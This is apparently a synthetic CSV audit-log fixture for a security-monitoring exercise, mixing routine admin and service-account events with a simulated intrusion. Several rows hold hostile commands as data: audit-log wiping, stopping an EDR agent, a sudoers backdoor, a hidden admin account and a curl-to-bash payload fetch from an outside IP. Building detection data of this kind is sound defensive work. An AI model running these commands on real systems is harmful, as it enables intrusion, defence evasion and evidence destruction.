@@ -1,0 +1,137 @@
+timestamp,actor,action,target,status,source_ip,actor_role,target_role,previous_role,command,approved,approval_reference,details
+2026-10-01T08:15:00Z,alex_admin,login,sso_auth_portal,success,10.0.10.15,admin,,,,True,SSO-SESSION-001,MFA authenticated via hardware token
+2026-10-01T08:30:20Z,rachel_iam,login,iam_identity_center,success,10.0.10.22,iam_manager,,,,True,SSO-SESSION-002,Routine morning session login
+2026-10-01T09:10:00Z,rachel_iam,create_user,emma_intern,success,10.0.10.22,iam_manager,intern,,useradd -m -s /bin/bash emma_intern,True,HR-REQ-9810,Provisioning autumn intern account
+2026-10-01T09:45:10Z,sam_devops,login,k8s_bastion,success,10.0.20.5,engineer,,,,,,Standard developer bastion session
+2026-10-01T10:15:30Z,alex_admin,update_config,web_proxy_nginx,success,10.0.10.15,admin,,,nginx -s reload,True,CHG-2026-101,Updated SSL cipher configuration during standard business hours
+2026-10-01T11:00:00Z,sam_devops,execute_command,build_runner_01,success,10.0.20.5,engineer,,,docker build -t app:v2.4.1 .,True,CI-PIPELINE-881,Scheduled container image build
+2026-10-01T12:00:00Z,alex_admin,logout,sso_auth_portal,success,10.0.10.15,admin,,,,,,Lunch break logout
+2026-10-01T13:05:00Z,alex_admin,login,sso_auth_portal,success,10.0.10.15,admin,,,,True,,Afternoon session login
+2026-10-01T14:20:00Z,rachel_iam,enable_account,contractor_tom,success,10.0.10.22,iam_manager,,,,True,TKT-4410,Contractor returning from scheduled leave
+2026-10-01T16:45:00Z,alex_admin,logout,sso_auth_portal,success,10.0.10.15,admin,,,,,,End of business day logout
+2026-10-02T08:30:00Z,alex_admin,login,sso_auth_portal,success,10.0.10.15,admin,,,,True,,Morning login
+2026-10-02T09:15:30Z,alex_admin,create_admin,jordan_security_lead,success,10.0.10.15,admin,global_admin,,iamctl create-admin --user jordan_security_lead --tier Tier0,True,SEC-CHG-902,Provisioned secondary security operations administrator
+2026-10-02T10:30:00Z,rachel_iam,change_privilege,contractor_steve,success,10.0.10.22,iam_manager,read_only_viewer,admin,iamctl modify-role --user contractor_steve --set viewer,True,IAM-REVOKE-105,Downgraded contractor privileges following project completion
+2026-10-02T11:15:00Z,malicious_probe,clear_logs,syslog_central,failed,198.51.100.88,guest,,,rm -rf /var/log/audit/*,False,,Permission denied: access restricted by SELinux
+2026-10-02T11:20:00Z,malicious_probe,disable_security,edr_agent_svc,failed,198.51.100.88,guest,,,systemctl stop crowdstrike-falcon,False,,Access denied by tamper protection kernel hook
+2026-10-02T14:10:00Z,rachel_iam,reset_password,emma_intern,success,10.0.10.22,iam_manager,,,,True,HELP-3301,Routine intern password reset after first logon
+2026-10-02T15:40:00Z,alex_admin,delete_user,former_employee_dave,success,10.0.10.15,admin,,,userdel -r former_employee_dave,True,HR-OFFBOARD-552,Deprovisioned ex-employee account and archived home directory
+2026-10-03T08:50:00Z,jordan_security_lead,login,sso_auth_portal,success,10.0.10.40,global_admin,,,,True,,Standard logon
+2026-10-03T09:30:15Z,alex_admin,change_privilege,marcus_analyst,success,10.0.10.15,admin,superuser,tier1_analyst,"usermod -aG wheel,sudo marcus_analyst",True,PAM-ELEV-771,Promoted Marcus to Tier-3 incident response superuser role
+2026-10-03T11:45:00Z,alex_admin,change_privilege,service_account_sync,success,10.0.10.15,admin,,,ldapmodify -f mod_privs.ldif,,,Automated sync permission update without detailed role transition metadata
+2026-10-03T14:15:00Z,alex_admin,reset_admin_password,root_emergency_acc,success,10.0.10.15,admin,root,,passwd root,True,VAULT-ROT-004,Quarterly rotation of break-glass vault root credential
+2026-10-03T16:20:00Z,marcus_analyst,export_sensitive,customer_pii_vault,success,10.0.10.55,superuser,,,pg_dump -t customers_encrypted db_prod | gpg -e > dump.gpg,True,LEGAL-REQ-120,Compliance subpoena record retrieval export
+2026-10-04T02:45:00Z,alex_admin,update_config,core_firewall_cluster,success,198.51.100.12,admin,,,iptables -A FORWARD -p tcp --dport 443 -j ACCEPT,True,EMERGENCY-HOTFIX-09,Emergency late-night ingress rule adjustment for edge gateway
+2026-10-04T03:10:00Z,alex_admin,login,vpn_concentrator,success,198.51.100.12,admin,,,,,,VPN dial-in during on-call rotation
+2026-10-04T13:20:00Z,rogue_dev,change_privilege,rogue_dev,success,203.0.113.88,developer,administrator,developer,sudo chown root:admin /etc/sudoers.d/backdoor,False,DENIED-BY-CAB-403,CAB change request was explicitly rejected due to missing architecture review
+2026-10-04T14:05:00Z,shadow_ops,create_admin,hidden_admin_svc,success,203.0.113.92,admin,admin,,useradd -G wheel hidden_admin_svc,False,UNAUTH-CHANGE,Administrative creation rejected by governance gate
+2026-10-04T15:00:00Z,alex_admin,create_admin,ci_cd_admin_agent,success,10.0.10.15,admin,admin,,create-service-account --name ci_cd_admin_agent,,,Automated pipeline setup where approval state was not logged
+2026-10-05T04:12:00Z,compromised_admin,clear_logs,var_log_auth,success,198.51.100.99,admin,,,echo '' > /var/log/auth.log && journalctl --vacuum-time=1s,False,,Malicious defense evasion - forensic log wiping
+2026-10-05T04:14:30Z,compromised_admin,disable_security,crowdstrike_agent,success,198.51.100.99,admin,,,/opt/CrowdStrike/falconctl -d -f --rfm-state=disabled,False,,Telemetry agent uninstallation / kill command executed
+2026-10-05T04:18:00Z,compromised_admin,execute_command,internal_dc_01,success,198.51.100.99,admin,,,curl http://198.51.100.200/payload.sh | bash,False,,Reverse shell dropper executed
+2026-10-05T04:35:00Z,soc_automated_responder,disable_account,compromised_admin,success,10.0.99.1,security_soar,,,usermod -L compromised_admin,True,SOAR-INCIDENT-992,Automated containment action: locked compromised account
+2026-10-06T09:05:00Z,sarah_dev,login,gitlab_server,failed,10.0.30.12,,,,,,,Mistyped password once
+2026-10-06T14:20:00Z,sarah_dev,login,gitlab_server,failed,10.0.30.12,,,,,,,Forgot password after weekend
+2026-10-06T10:00:10Z,attacker_recon,login,ssh_gateway,failed,198.51.100.44,,,,,,,Auth failed: invalid private key
+2026-10-06T10:01:25Z,attacker_recon,login,ssh_gateway,failed,198.51.100.44,,,,,,,Auth failed: password brute force attempt 1
+2026-10-06T10:02:40Z,attacker_recon,login,ssh_gateway,failed,198.51.100.44,,,,,,,Auth failed: password brute force attempt 2
+2026-10-06T10:04:10Z,attacker_recon,login,ssh_gateway,failed,198.51.100.44,,,,,,,Auth failed: password brute force attempt 3
+2026-10-06T10:05:30Z,attacker_recon,login,ssh_gateway,failed,198.51.100.44,,,,,,,Auth failed: password brute force attempt 4 (Reaches threshold of 5!)
+2026-10-06T10:06:50Z,attacker_recon,login,ssh_gateway,failed,198.51.100.44,,,,,,,Auth failed: ongoing brute force attempt 5 (Suppressed/correlated)
+2026-10-06T10:07:30Z,attacker_recon,login,ssh_gateway,failed,198.51.100.44,,,,,,,Auth failed: connection terminated by fail2ban
+2026-10-01T09:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 9
+2026-10-01T09:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-01T09:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-01T09:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-01T11:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 11
+2026-10-01T11:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-01T11:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-01T11:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-01T14:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 14
+2026-10-01T14:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-01T14:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-01T14:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-01T16:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 16
+2026-10-01T16:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-01T16:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-01T16:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-02T09:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 9
+2026-10-02T09:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-02T09:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-02T09:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-02T11:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 11
+2026-10-02T11:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-02T11:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-02T11:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-02T14:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 14
+2026-10-02T14:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-02T14:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-02T14:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-02T16:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 16
+2026-10-02T16:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-02T16:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-02T16:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-03T09:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 9
+2026-10-03T09:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-03T09:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-03T09:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-03T11:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 11
+2026-10-03T11:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-03T11:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-03T11:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-03T14:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 14
+2026-10-03T14:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-03T14:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-03T14:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-03T16:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 16
+2026-10-03T16:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-03T16:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-03T16:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-04T09:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 9
+2026-10-04T09:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-04T09:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-04T09:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-04T11:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 11
+2026-10-04T11:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-04T11:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-04T11:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-04T14:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 14
+2026-10-04T14:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-04T14:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-04T14:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-04T16:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 16
+2026-10-04T16:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-04T16:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-04T16:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-05T09:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 9
+2026-10-05T09:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-05T09:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-05T09:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-05T11:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 11
+2026-10-05T11:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-05T11:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-05T11:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-05T14:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 14
+2026-10-05T14:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-05T14:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-05T14:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-05T16:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 16
+2026-10-05T16:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-05T16:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-05T16:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-06T09:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 9
+2026-10-06T09:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-06T09:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-06T09:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-06T11:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 11
+2026-10-06T11:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-06T11:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-06T11:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-06T14:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 14
+2026-10-06T14:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-06T14:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-06T14:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
+2026-10-06T16:00:00Z,backup_service_acc,login,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,AUTO-CRON-SYNC,Automated snapshot synchronization round 16
+2026-10-06T16:25:00Z,backup_service_acc,logout,backup_nas_cluster,success,10.0.50.10,service_account,,,,True,,Snapshot sync completed cleanly
+2026-10-06T16:40:00Z,telemetry_daemon,execute_command,agent_collector_01,success,10.0.90.5,daemon,,,/usr/bin/prom_exporter --gather,True,,Gathered node health metrics
+2026-10-06T16:55:00Z,monitoring_bot,update_config,health_thresholds,success,10.0.90.8,bot,,,refresh-thresholds --auto,True,,Auto-adjusted disk alert thresholds
